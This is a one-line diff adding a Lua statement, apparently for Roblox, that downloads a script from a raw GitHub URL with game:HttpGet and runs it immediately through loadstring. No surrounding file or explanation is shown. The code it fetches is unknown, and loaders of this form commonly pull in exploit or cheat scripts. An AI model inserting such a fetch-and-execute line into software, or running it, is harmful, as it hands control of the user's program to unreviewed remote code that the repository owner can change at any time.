@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vrxyxy/sdfscsgt/refs/heads/main/main_lua"))()
